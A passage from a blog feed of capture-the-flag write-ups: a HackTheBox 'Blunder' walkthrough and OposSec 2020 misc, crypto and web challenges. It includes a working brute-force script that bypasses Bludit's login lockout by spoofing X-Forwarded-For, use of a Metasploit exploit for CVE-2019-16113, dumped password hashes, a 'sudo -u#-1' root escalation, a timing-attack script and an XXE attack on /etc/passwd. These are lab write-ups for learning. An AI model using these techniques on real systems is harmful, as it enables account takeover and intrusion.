+<!--kg-card-end: markdown--><hr>]]></content:encoded></item><item><title><![CDATA[HTB Write-up  | Blunder]]></title><description><![CDATA[<p><em>Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/254">here</a>.</em></p><h2 id="scanning">Scanning</h2><p>Scanning with <code>nmap</code> only retrieved an <code>Apache</code> web server running on port 80.</p><!--kg-card-begin: markdown--><pre><code>~ nmap -sV -sC -A blunder.htb
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-12 10:13 WEST
+Nmap scan report for blunder.htb (10.10.10.191)
+Host is</code></pre>]]></description><link>https://inesmartins.github.io//htb-write-up-blunder/</link><guid isPermaLink="false">5ee346443d00be7291b53cc6</guid><category><![CDATA[htb]]></category><category><![CDATA[bludit]]></category><category><![CDATA[cms]]></category><category><![CDATA[cewl]]></category><category><![CDATA[apache]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Thu, 22 Oct 2020 08:50:44 GMT</pubDate><media:content url="https://inesmartins.github.io//content/images/2020/06/infocard.png" medium="image"/><content:encoded><![CDATA[<img src="https://inesmartins.github.io//content/images/2020/06/infocard.png" alt="HTB Write-up  | Blunder"><p><em>Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/254">here</a>.</em></p><h2 id="scanning">Scanning</h2><p>Scanning with <code>nmap</code> only retrieved an <code>Apache</code> web server running on port 80.</p><!--kg-card-begin: markdown--><pre><code>~ nmap -sV -sC -A blunder.htb
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-12 10:13 WEST
+Nmap scan report for blunder.htb (10.10.10.191)
+Host is up (0.48s latency).
+Not shown: 998 filtered ports
+PORT   STATE  SERVICE VERSION
+21/tcp closed ftp
+80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-generator: Blunder
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Blunder | A blunder of interesting facts
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 100.87 seconds
+</code></pre>
+<!--kg-card-end: markdown--><p>The <a href="http://blunder.htb/">Home</a> and <a href="http://blunder.htb/about">About</a> pages are very simple, just a couple of posts that don't seem very relevant, but from the source code we can tell this blog was created using version 3.9.2. of the <a href="https://www.bludit.com/">Bludit CMS</a>.</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/home-1.png" class="kg-image" alt="HTB Write-up  | Blunder"></figure><h3 id="checking-for-bludit-vulnerabilities">Checking for Bludit Vulnerabilities</h3><p>As with most Bludit-based applications, this one has an <a href="http://blunder.htb/admin/">admin page</a>:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/admin-1.png" class="kg-image" alt="HTB Write-up  | Blunder"></figure><p>After checking for <a href="https://www.cvedetails.com/vulnerability-list.php?vendor_id=17229&amp;product_id=41420&amp;version_id=&amp;page=1&amp;hasexp=0&amp;opdos=0&amp;opec=0&amp;opov=0&amp;opcsrf=0&amp;opgpriv=0&amp;opsqli=0&amp;opxss=0&amp;opdirt=0&amp;opmemc=0&amp;ophttprs=0&amp;opbyp=0&amp;opfileinc=0&amp;opginf=0&amp;cvssscoremin=0&amp;cvssscoremax=0&amp;year=0&amp;month=0&amp;cweid=0&amp;order=3&amp;trc=8&amp;sha=012a032fbb16ed1554a64233f60621639d4bf196">vulnerabilities</a> there is only 1 that matches this version and seems interesting:</p><blockquote><a href="https://www.cvedetails.com/cve/CVE-2019-16113/">CVE-2019-16113</a>: "remote code execution via <a href="http://blunder.htb/bl-kernel/ajax/upload-images.php">bl-kernel/ajax/upload-images.php</a> because PHP code can be entered with a .jpg file name, and then this PHP code can write other PHP code to a ../ pathname."</blockquote><p>From the CVE Details page we also know there's a <a href="https://www.rapid7.com/db/modules/exploit/linux/http/bludit_upload_images_exec">Metasploit module</a> linked to this CVE, however, this module requires us to know user and pass.</p><!--kg-card-begin: markdown--><pre><code>msf5 &gt; use exploit/linux/http/bludit_upload_images_exec
+
+msf5 exploit(linux/http/bludit_upload_images_exec) &gt; show info
+...
+Description:
+  This module exploits a vulnerability in Bludit. A remote user could 
+  abuse the uuid parameter in the image upload feature in order to 
+  save a malicious payload anywhere onto the server, and then use a 
+  custom .htaccess file to bypass the file extension check to finally 
+  get remote code execution.
+</code></pre>
+<!--kg-card-end: markdown--><p>We don't know the credentials but according to <a href="https://github.com/bludit/bludit/issues/1026">this open Github issue</a>, we do know that the username is <code>admin</code><strong> </strong>by default, which means we might be able to brute-force the password.</p><h3 id="bypassing-brute-force-protection">Bypassing Brute Force Protection</h3><p>When I tried to brute-force the password using <a href="https://portswigger.net/burp">Burp</a>, only the first request seemed to be processed correctly, the following requests all returned <code>301</code>. </p><p>After a bit of Googling, I realised this is caused by Bludit's "<a href="https://docs.bludit.com/en/security/brute-force-protection">Brute Force Protection</a>" feature, that's present on all versions after 3.9.2. </p><p>Luckily, some more Googling produced a very useful <a href="https://rastating.github.io/bludit-brute-force-mitigation-bypass/">article</a> that tells us how to bypass this mechanism. Turns out, the application determines the user's IP by trusting the <code>X-Forwarded-For</code> and <code>Client-IP</code> HTTP headers. Once Bludit detects more than x failed authentication requests (this number is configurable), it starts rejecting the authentication requests.</p><p>Since there's no validation that the IP is valid, we can simply pass the password as the <code>X-Forwarded-For</code> param, and then we can try to brute-force the passwords:</p><pre><code class="language-python">#!/usr/bin/env python3
+import re
+import requests
+
+host = 'http://blunder.htb'
+login_url = host + '/admin/login'
+username = 'admin'
+pwd_file = "wordlist.txt"
+
+# read passwords from file and adds them to wordlist array
+wordlist = []
+file = open(pwd_file, "r")
+for line in file: 
+    wordlist.append(line.strip())
+
+for password in wordlist:
+    session = requests.Session()
+    login_page = session.get(login_url)
+    csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)
+
+    print('[*] Trying: {p}'.format(p = password))
+
+    headers = {
+        'X-Forwarded-For': password,
+        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
+        'Referer': login_url
+    }
+
+    data = {
+        'tokenCSRF': csrf_token,
+        'username': username,
+        'password': password,
+        'save': ''
+    }
+
+    login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)
+
+    if 'location' in login_result.headers:
+        if '/admin/dashboard' in login_result.headers['location']:
+            print()
+            print('SUCCESS: Password found!')
+            print('Use {u}:{p} to login.'.format(u = username, p = password))
+            print()
+            break</code></pre><p>None of the usual wordlists worked, so, following a tip from the <a href="https://forum.hackthebox.eu/discussion/3363/official-blunder-discussion/p9">Forum</a> I decided to create a custom wordlist from the website using <a href="https://tools.kali.org/password-attacks/cewl">CeWL</a>:</p><!--kg-card-begin: markdown--><pre><code>$ cewl -d 1 -m 5 -w blunder-wordlist.txt http://blunder.htb
+</code></pre>
+<!--kg-card-end: markdown--><ul><li><code>-d</code> indicates the max scan depth;</li><li><code>-m</code> is the minimum word length;</li><li><code>-w</code> file where the wordlist will be written to.</li></ul><p>Unfortunately, this also failed, so I went back fuzzing.</p><hr><h3 id="fuzzing-for-credentials">Fuzzing for Credentials</h3><p>It took a while but I finally found something interesting:</p><!--kg-card-begin: markdown--><pre><code>$ wfuzz -w common.txt --hc 404 http://blunder.htb/FUZZ.txt
+...
+000004125:   200        4 L      23 W     118 Ch      &quot;todo&quot;
+...
+</code></pre>
+<!--kg-card-end: markdown--><p>The <a href="http://blunder.htb/todo.txt">todo file</a> contains the following information:</p><!--kg-card-begin: markdown--><pre><code>-Update the CMS
+-Turn off FTP - DONE
+-Remove old users - DONE
+-Inform fergus that the new blog needs images - PENDING
+</code></pre>
+<!--kg-card-end: markdown--><p>So, some interesting new information:</p><ul><li>there is an <code>FTP</code> service configured on this machine;</li><li>there is someone named <code>fergus</code> that might correspond to a user name;</li></ul><p>So, again we try to brute-force the password but now for the user <code>fergus</code>.</p><!--kg-card-begin: markdown--><pre><code>$ python3 bludit-bruteforce.py
+...
+SUCCESS: Password found!
+Use fergus:RolandDeschain to login.
+</code></pre>
+<!--kg-card-end: markdown--><hr><h2 id="getting-user">Getting User</h2><p>Now that we have valid credentials for <code>fergus</code>, we can test the <a href="https://www.rapid7.com/db/modules/exploit/linux/http/bludit_upload_images_exec">Metasploit module</a> we found previously. After changing the payload, we're in!</p><pre><code>meterpreter &gt; getuid
+Server username: www-data (33)
+
+meterpreter &gt; sysinfo
+Computer    : blunder
+OS          : Linux blunder 5.3.0-53-generic #47-Ubuntu SMP Thu May 7 12:18:16 UTC 2020 x86_64
+Meterpreter : php/linux</code></pre><p>Now that we have access to the blog's source files, we can read the <code>users.php</code> database:</p><pre><code>&gt; cat databases/users.php
+
+&lt;?php defined('BLUDIT') or die('Bludit CMS.'); ?&gt;
+{
+    "admin": {
+        "nickname": "Admin",
+        "firstName": "Administrator",
+        "lastName": "",
+        "role": "admin",
+        "password": "bfcc887f62e36ea019e3295aafb8a3885966e265",
+        "salt": "5dde2887e7aca",
+        "email": "",
+        "registered": "2019-11-27 07:40:55",
+        "tokenRemember": "",
+        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
+        "tokenAuthTTL": "2009-03-15 14:00",
+        ...
+    },
+    "fergus": {
+        "firstName": "&amp;quot; or 1=1 #",
+        "lastName": "&amp;quot; or 1=1 #",
+        "nickname": "&amp;quot; or 1=1 #",
+        "description": "",
+        "role": "author",
+        "password": "be5e169cdf51bd4c878ae89a0a89de9cc0c9d8c7",
+        "salt": "jqxpjfnv",
+        "email": "&amp;quot; or 1=1 #",
+        "registered": "2019-11-27 13:26:44",
+        "tokenRemember": "73a6fca50fe0ad2edb1390e0a1bfb8b5",
+        "tokenAuth": "0e8011811356c0c5bd2211cba8c50471",
+        "tokenAuthTTL": "2009-03-15 14:00",
+        ...
+    }
+}</code></pre><p>There is also a folder for another version of the application, which contains a different version of the <code>users.php</code> database:</p><pre><code>cat /var/www/bludit-3.10.0a/bl-content/databases/users.php
+&lt;?php defined('BLUDIT') or die('Bludit CMS.'); ?&gt;
+{
+    "admin": {
+        "nickname": "Hugo",
+        "firstName": "Hugo",
+        "lastName": "",
+        "role": "User",
+        "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",
+        "email": "",
+        "registered": "2019-11-27 07:40:55",
+        "tokenRemember": "",
+        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
+        "tokenAuthTTL": "2009-03-15 14:00",
+        ...
+}</code></pre><p>So, we now have the following credentials:</p><!--kg-card-begin: markdown--><table>
+<thead>
+<tr>
+<th>username</th>
+<th>hash</th>
+<th>salt</th>
+<th>password</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>fergus</td>
+<td>bfcc887f62e36ea019e3295aafb8a3885966e265</td>
+<td>5dde2887e7aca</td>
+<td>RolandDeschain</td>
+</tr>
+<tr>
+<td>admin</td>
+<td>be5e169cdf51bd4c878ae89a0a89de9cc0c9d8c7</td>
+<td>jqxpjfnv</td>
+<td></td>
+</tr>
+<tr>
+<td>admin (hugo)</td>
+<td>faca404fd5c0a31cf1897b823c695c85cffeb98d</td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<!--kg-card-end: markdown--><p>This last user is particularly interesting because <code>hugo</code> is one of the users that have a directory on the <code>home</code> dir:</p><pre><code>Listing: /home
+==============
+
+Mode             Size  Type  Last modified              Name
+----             ----  ----  -------------              ----
+40755/rwxr-xr-x  4096  dir   2020-05-26 09:29:29 +0100  hugo
+40755/rwxr-xr-x  4096  dir   2020-04-28 12:13:35 +0100  shaun</code></pre><p>After some googling, I realised hugo's password is just a non-salted <code>SHA-1</code> hash for <code>Password120</code>. Let's authenticate as <code>hugo</code>:</p><pre><code>meterpreter &gt; shell
+Process 32464 created.
+Channel 10 created.
+su - hugo
+Password: Password120
+
+cat user.txt
+c0c23698b18cc480ebd74fd6570281ef</code></pre><hr><h2 id="getting-root">Getting root</h2><p>This is one of those instances of starting with the <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-14287">low-hanging fruit:</a></p><pre><code>hugo@blunder:~$ sudo -u#-1 bash
+sudo -u#-1 bash
+Password: Password120
+
+root@blunder:/home/hugo# cat /root/root.txt
+cat /root/root.txt
+6ffe09ebd667f8eb04c6c65b6260e6ce
+root@blunder:/home/hugo#</code></pre><p>That's it! Hope you enjoyed it!</p>]]></content:encoded></item><item><title><![CDATA[ØxOPOSɆC Summer Challenge 2020 | Misc Challenges Write-up]]></title><description><![CDATA[<h2 id="1-my-paste-100">1 . My Paste | 100</h2><blockquote>Oh no! I forgot where I left my paste. 🗑<br>Perhaps you can help me find it?</blockquote><p>The source code has a little hidden clue:</p><pre><code>&lt;span class="challenge-desc"&gt;&lt;br&gt;
+Oh no! I forgot where I left my paste.  🗑
+&lt;p&gt;Perhaps you</code></pre>]]></description><link>https://inesmartins.github.io//oposec-summer-challenge-2020/</link><guid isPermaLink="false">5f19d1cf1e7da103a083f24c</guid><category><![CDATA[sstv]]></category><category><![CDATA[piet]]></category><category><![CDATA[esolang]]></category><category><![CDATA[misc]]></category><category><![CDATA[ctf]]></category><category><![CDATA[oposec]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Fri, 25 Sep 2020 18:51:44 GMT</pubDate><media:content url="https://inesmartins.github.io//content/images/2020/09/heading3.png" medium="image"/><content:encoded><![CDATA[<h2 id="1-my-paste-100">1 . My Paste | 100</h2><blockquote>Oh no! I forgot where I left my paste. 🗑<br>Perhaps you can help me find it?</blockquote><img src="https://inesmartins.github.io//content/images/2020/09/heading3.png" alt="ØxOPOSɆC Summer Challenge 2020 | Misc Challenges Write-up"><p>The source code has a little hidden clue:</p><pre><code>&lt;span class="challenge-desc"&gt;&lt;br&gt;
+Oh no! I forgot where I left my paste.  🗑
+&lt;p&gt;Perhaps you can help me find it?&lt;/p&gt;
+&lt;p style="color: white"&gt;2WvYM5Qx&lt;/p&gt;&lt;/span&gt;</code></pre><p>Since <code>2WvYM5Qx</code> is not the correct flag, it was a matter of thinking outside the box to get to the final answer:  <a href="https://pastebin.com/2WvYM5Qx">https://pastebin.com/2WvYM5Qx</a>.</p><pre><code>Good job!
+flag{f1n0_5Up3r_b0ck_fr3squ1nho}</code></pre><hr><h2 id="2-slowly-but-surely-200">2. Slowly But Surely | 200</h2><blockquote>I think aliens may be trying to communicate.<br>What are they trying to say?</blockquote><p>Let's take a look at some basic info about the <code>trasmission.wav</code> file using <code>mediainfo</code>:</p><pre><code>~ mediainfo transmission.wav
+
+General
+Complete name                            : transmission.wav
+Format                                   : Wave
+File size                                : 10.6 MiB
+Duration                                 : 1 min 56 s
+Overall bit rate mode                    : Constant
+Overall bit rate                         : 768 kb/s
+
+Audio
+Format                                   : PCM
+Format settings                          : Little / Signed
+Codec ID                                 : 1
+Duration                                 : 1 min 56 s
+Bit rate mode                            : Constant
+Bit rate                                 : 768 kb/s
+Channel(s)                               : 1 channel
+Sampling rate                            : 48.0 kHz
+Bit depth                                : 16 bits
+Stream size                              : 10.6 MiB (100%)</code></pre><p>After discarding the usual audio steganography I decided to take a look at the audio's spectrogram using <a href="https://www.sonicvisualiser.org/">Sonic Visualiser</a>. </p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/07/image-5.png" class="kg-image" alt="ØxOPOSɆC Summer Challenge 2020 | Misc Challenges Write-up"></figure><p>Because I'm not an expert on audio signals, I decided to Google Image search for signals that looked similar to the one shown on the spectrogram. It didn't take long until I came across <a href="https://bolek42.github.io/ctf/2017-PlaidCTF/terebeep/README.html">this write-up</a> with an eerily similar signal, that corresponds to a <a href="https://en.wikipedia.org/wiki/Slow-scan_television">SSTV (Slow Scan TeleVision)</a> transmission.</p><blockquote>Slow Scan television (SSTV) is a picture transmission method used mainly by amateur radio operators, to transmit and receive static pictures via radio in monochrome or color.</blockquote><p>This plus the hint let me know I was on the right track (however I later found out I should really be using <a href="https://inesmartins.github.io//p/e400ca1f-a8ad-467c-aecb-2103a5dde81e/www.sigidwiki.co">sigid</a> to identify the signal).</p><p>After spending <em>a lot </em>of time trying to make some Linux tools work for this task I had to use Windows <a href="http://rxsstv.cqsstv.com/">RX-SSTV</a> to finally decode the message:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/07/WhatsApp-Image-2020-07-26-at-10.56.50--1-.jpeg" class="kg-image" alt="ØxOPOSɆC Summer Challenge 2020 | Misc Challenges Write-up"></figure><hr><h2 id="3-run-300-">3. Run (300)</h2><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/07/image-26.png" class="kg-image" alt="ØxOPOSɆC Summer Challenge 2020 | Misc Challenges Write-up"></figure><p>This was the only challenge I wasn't able to finish. It turns out this image is actually a program "written" in the the <a href="https://esolangs.org/wiki/Piet">Piet esolang</a>. </p><blockquote>Piet is a <a href="https://esolangs.org/wiki/Stack">stack-based</a><a href="https://esolangs.org/wiki/Esoteric_programming_language">esoteric programming language</a> in which programs look like abstract paintings. It uses 20 colors, of which 18 are related cyclically through a lightness cycle and a hue cycle. [<a href="https://esolangs.org/wiki/Piet">Source</a>]</blockquote><p>There's a handy utility called <a href="https://www.bertnase.de/npiet/">npiet</a> that we could use to get the flag from the file (I had to convert it to PPM first).</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/09/image-37.png" class="kg-image" alt="ØxOPOSɆC Summer Challenge 2020 | Misc Challenges Write-up"></figure><hr><h2 id="helpful-sources">Helpful Sources</h2><ul><li><a href="https://bolek42.github.io/ctf/2017-PlaidCTF/terebeep/README.html">https://bolek42.github.io/ctf/2017-PlaidCTF/terebeep/README.html</a></li><li><a href="https://wiki.gnuradio.org/index.php/Wav_File_Source">https://wiki.gnuradio.org/index.php/Wav_File_Source</a></li><li><a href="https://charlesreid1.com/wiki/Gnuradio/Wav_to_Waterfall">https://charlesreid1.com/wiki/Gnuradio/Wav_to_Waterfall</a></li><li><a href="https://medium.com/analytics-vidhya/get-secret-message-from-audio-file-8769421205c3">https://medium.com/analytics-vidhya/get-secret-message-from-audio-file-8769421205c3</a></li><li><a href="https://trailofbits.github.io/ctf/forensics/">https://trailofbits.github.io/ctf/forensics/</a></li></ul>]]></content:encoded></item><item><title><![CDATA[ØxOPOSɆC Summer Challenge 2020 | Crypto Challenges Write-up]]></title><description><![CDATA[<h2 id="knock-knock-100-">Knock Knock (100)</h2><blockquote><code>21 31 11 22 { 32 11 44 15 45 43 42 34 43 15 }</code></blockquote><p>If I had known about <a href="https://en.wikipedia.org/wiki/Tap_code">Tap Code</a> (aka Knock Code) this would have been straightforward. I ended up getting the flag with some "leaps of logic". </p><p>Basically, by knowing that the first 4</p>]]></description><link>https://inesmartins.github.io//oxopos-c-summer-challenge-2020-web-challenges-write-up/</link><guid isPermaLink="false">5f19e8b81e7da103a083f2ca</guid><category><![CDATA[tap code]]></category><category><![CDATA[bacon cipher]]></category><category><![CDATA[timing attack]]></category><category><![CDATA[crypto]]></category><category><![CDATA[ctf]]></category><category><![CDATA[oposec]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Fri, 25 Sep 2020 10:30:14 GMT</pubDate><media:content url="https://inesmartins.github.io//content/images/2020/09/headers1.png" medium="image"/><content:encoded><![CDATA[<h2 id="knock-knock-100-">Knock Knock (100)</h2><blockquote><code>21 31 11 22 { 32 11 44 15 45 43 42 34 43 15 }</code></blockquote><img src="https://inesmartins.github.io//content/images/2020/09/headers1.png" alt="ØxOPOSɆC Summer Challenge 2020 | Crypto Challenges Write-up"><p>If I had known about <a href="https://en.wikipedia.org/wiki/Tap_code">Tap Code</a> (aka Knock Code) this would have been straightforward. I ended up getting the flag with some "leaps of logic". </p><p>Basically, by knowing that the first 4 numbers probably matched the word <code>flag</code>:</p><pre><code>a =&gt; 11
+f =&gt; 21
+g =&gt; 22
+l =&gt; 31</code></pre><p>I was able to infer the rest of the letters:</p><pre><code>a =&gt; 11
+b =&gt; 12
+c =&gt; 13
+d =&gt; 14
+e =&gt; 15
+
+// 6 number jump 
+
+f =&gt; 21
+g =&gt; 22
+h =&gt; 23
+i =&gt; 24
+j =&gt; 25
+k =&gt; 26
+
+// 5 number jump 
+
+l =&gt; 31
+m =&gt; 32
+n =&gt; 33
+o =&gt; 34
+p =&gt; 35
+q =&gt; 36
+
+// 6 number jump 
+
+r =&gt; 42
+s =&gt; 43
+t =&gt; 44
+u =&gt; 45</code></pre><p>Which got me the flag:  <code>flag{mateusrose}</code> </p><hr><h2 id="pancetta-200-">Pancetta (200)</h2><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/07/image-4.png" class="kg-image" alt="ØxOPOSɆC Summer Challenge 2020 | Crypto Challenges Write-up"></figure><p>The clue was a dead giveaway on this one: Pancetta -&gt; <a href="https://en.wikipedia.org/wiki/Bacon%27s_cipher">Bacon cipher</a>. </p><p>I replaced every pink letter with a <code>1</code> and every black letter with a <code>0</code> and then decoded the cipher-text using <a href="https://gchq.github.io/CyberChef/#recipe=Bacon_Cipher_Decode('Standard%20(I%3DJ%20and%20U%3DV)','0/1',false)&amp;input=MTAwMDExMDAxIDEwIDExMDAwMCAwMTEwMDAgMDAwMCAxMDAwMDAxMCAwMDAwIDAxMCAwMDAwIDAwMCAwMDEwIDExMDAgMTAgMDAxMCAxMCAwMSAxMDExMSAxMDAxMTEwIDAxMTEwMDEgMTEwMDExIDEwIDAxMSAxMDAxIDExMDAxMSAxMDA">CyberChef</a>.</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/07/image-31.png" class="kg-image" alt="ØxOPOSɆC Summer Challenge 2020 | Crypto Challenges Write-up"></figure><hr><h2 id="streamside-300-">Streamside (300)</h2><blockquote>No one will give you the flag this time.<br>You will find it out by yourself. Take your time.<br><a href="https://streamside.apl3b.com/">https://streamside.apl3b.com</a></blockquote><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/07/image-32.png" class="kg-image" alt="ØxOPOSɆC Summer Challenge 2020 | Crypto Challenges Write-up"></figure><p>This challenge consisted of a web page with an input field where we could enter and validate a flag. After some poking around I realised that just by entering the word <code>flag</code> it took the server a lot longer to respond that when we entered something else, which made me think this was a <a href="https://en.wikipedia.org/wiki/Timing_attack">timing attack</a>.</p><p>Initially I created a Python script to find the complete flag automatically, but the results were unreliable so I decided to use the script to output the results for each letter of the flag, and then analyse them manually:</p><pre><code>~ cat curl-format.txt
+time_total:  %{time_total}</code></pre><pre><code class="language-python">import os
+
+alphabet = "abcdefghijklmnopqrstuvxwyz0123456789ABCDEFGHIJKLMNOPQRSTUVXWYZ!\"#$%&amp;/()=?*`|^_:;-"
+url = "https://streamside.apl3b.com/process"
+output_filename = "output.txt"
+format_filename = "@curl-format.txt"
+
+result_str = ""
+os.system("rm " + output_filename)
+
+for letter in alphabet:
+
+    # builds new test flag
+    tmp_flag = "flag=flag{" + letter + "}"
+
+    # executes command
+    print("Trying " + tmp_flag)
+    cmd = "curl -s -d '" + tmp_flag + "' -w '" + format_filename + "' -X POST " + url
+    result = os.popen(cmd).read()
+
+    # parses result and prints it
+    answer = result.split(" ")[0].split("\n")[0].strip()
+    time_total = result.split("time_total:")[1].strip()
+
+    # saves result to string
+    result_str += letter + "=" + str(time_total) + "\n"
+
+    # checks message
+    if "Wrong" not in answer:
+        print("Found it! Flag is " + tmp_flag)
+    
+os.system("echo '" + result_str + "' &gt; " + output_filename)
+os.system("open " + output_filename)</code></pre><p>And we get the flag: <code>flag{c4l1Po_de_l1M4o}</code>.</p>]]></content:encoded></item><item><title><![CDATA[ØxOPOSɆC Summer Challenge 2020 | Web Challenges Write-up]]></title><description><![CDATA[<h2 id="passive-aggressive-flask-100-">Passive-Aggressive Flask (100)</h2><blockquote>I can give you a flag, but you'll have to be nice.<br>Remember to say it LOUD, so I can hear you.<br><a href="https://passiveaggressive.apl3b.com/">https://passiveaggressive.apl3b.com</a></blockquote><pre><code>~ curl https://passiveaggressive.apl3b.com
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang="en"&gt;
+&lt;head&gt;
+  &lt;meta charset="utf-8"</code></pre>]]></description><link>https://inesmartins.github.io//oposec-summer-challenge-2020-web-challenges-write-up/</link><guid isPermaLink="false">5f19e6891e7da103a083f2a8</guid><category><![CDATA[web]]></category><category><![CDATA[flask]]></category><category><![CDATA[JS]]></category><category><![CDATA[javascript]]></category><category><![CDATA[regex]]></category><category><![CDATA[xml]]></category><category><![CDATA[xxe attack]]></category><category><![CDATA[ctf]]></category><category><![CDATA[oposec]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Thu, 24 Sep 2020 18:49:15 GMT</pubDate><media:content url="https://inesmartins.github.io//content/images/2020/09/header2.png" medium="image"/><content:encoded><![CDATA[<h2 id="passive-aggressive-flask-100-">Passive-Aggressive Flask (100)</h2><blockquote>I can give you a flag, but you'll have to be nice.<br>Remember to say it LOUD, so I can hear you.<br><a href="https://passiveaggressive.apl3b.com/">https://passiveaggressive.apl3b.com</a></blockquote><pre><code>~ curl https://passiveaggressive.apl3b.com
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang="en"&gt;
+&lt;head&gt;
+  &lt;meta charset="utf-8"&gt;
+  &lt;title&gt;Passive-Aggressive Flask&lt;/title&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+Not so fast.
+&lt;br&gt;
+You think you can just boss me around? 😠
+&lt;br&gt;
+Be &lt;i&gt;polite&lt;/i&gt;!
+&lt;/body&gt;
+&lt;/html&gt;%</code></pre><img src="https://inesmartins.github.io//content/images/2020/09/header2.png" alt="ØxOPOSɆC Summer Challenge 2020 | Web Challenges Write-up"><p>Looking at the clues I was pretty sure this challenge was going to be solved by sending some sort of specific keyword, such as "please" on all caps (because of the LOUD clue), but I wasn't sure how.</p><p>After some trial and error I finally got it:</p><pre><code>~ curl -X PLEASE https://passiveaggressive.apl3b.com
+
+...
+&lt;body&gt;
+Oh, finally someone who shows some respect. ☺️
+&lt;br&gt;
+Here, take this juicy flag: &lt;i&gt;flag{g4spach0_n0_t4ch0}&lt;/i&gt;!
+&lt;br&gt;
+(props to Pixels Camp 2020 Quiz Qualifiers &lt;3)
+&lt;/body&gt;
+&lt;/html&gt;%</code></pre><hr><h2 id="2020-200-">2020 (200)</h2><blockquote>Just represent the number 2020.<br>Easy, right? No digits allowed.<br><a href="https://2020.apl3b.com/">https://2020.apl3b.com</a></blockquote><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/07/image-6.png" class="kg-image" alt="ØxOPOSɆC Summer Challenge 2020 | Web Challenges Write-up"></figure><p>Let's take a look at the source code to see what kind of validations are taking place:</p><pre><code class="language-javascript">...
+app.get('/', function (req, res, next) {
+  let output = '';
+  const code = req.query.code + '';
+  if (code &amp;&amp; code.length &lt; 300 &amp;&amp; !/[^a-z().]/.test(code)) {
+    try {
+      const result = vm.runInNewContext(code, {}, { timeout: 500 });
+      if (result === 2020) {
+        output = process.env.FLAG;
+      } else {
+        output = 'nope';
+      }
+    } catch (e) {
+      output = 'nope';
+    }
+  } else {
+    output = 'nope';
+  }
+  res.render('index', { title: '[a-z().]', output });
+});
+...</code></pre><p>So, basically we needed to find a piece of JS code that:</p><ul><li>was under 300 characters;</li><li>matched this REGEX: <code>!/[^a-z().]/</code>;</li><li>produced the number <code>2020</code>;</li><li>used functions and variables known to the <code>NodeJS</code> context.</li></ul><p>This last condition ended up being the hardest, and I had to rely pretty heavily on the <code>eval</code> function:</p><pre><code>eval.length.constructor(                  // Number()
+  eval.name.constructor.apply()           // String()
+    .concat(eval.name.big.apply.length)   // 2
+    .concat(eval.name.bold.length)        // 0
+    .concat(eval.name.big.apply.length)   // 2
+    .concat(eval.name.bold.length))       // 0</code></pre><p>Alternatively I found one that's a little longer:</p><pre><code>eval.length.constructor(
+  eval.name.constructor.apply()
+    .concat(((typeof(null))
+      .concat((typeof(null)))
+      .concat(typeof(eval)).length))
+    .concat(((typeof(null))
+      .concat((typeof(null)))
+      .concat(typeof(eval)).length)))</code></pre><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/09/image-36.png" class="kg-image" alt="ØxOPOSɆC Summer Challenge 2020 | Web Challenges Write-up"></figure><hr><h2 id="extensible-risky-language-300-">Extensible Risky Language (300)</h2><blockquote>Your flag is securely stored in <code>/etc/passwd</code> .<br><a href="https://risky.apl3b.com/">https://risky.apl3b.com</a></blockquote><p>I smell an <code>XXE</code> attack!</p><p>When we submit our shoe size, the size is reflected below the input field, so I immediately thought the idea was to manipulate the <code>XML</code> sent to the server in order to fetch the <code>/etc/passwd</code> file.</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/07/image-13.png" class="kg-image" alt="ØxOPOSɆC Summer Challenge 2020 | Web Challenges Write-up"></figure><p>If this wasn't enough of a clue, it looks like the devs are not great at XML.</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/07/image-11.png" class="kg-image" alt="ØxOPOSɆC Summer Challenge 2020 | Web Challenges Write-up"></figure><p>And indeed when we send a <code>POST</code> request to <a href="https://risky.apl3b.com/process">https://risky.apl3b.com/process</a> with our shoe size, the form data is sent in XML:</p><pre><code>xml: &lt;stock&gt;&lt;size&gt;34&lt;/size&gt;&lt;/stock&gt;</code></pre><p>Let's exploit <a href="https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing">this vulnerability</a> to get the content of the <code>/etc/passwd</code> file:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/07/image-15.png" class="kg-image" alt="ØxOPOSɆC Summer Challenge 2020 | Web Challenges 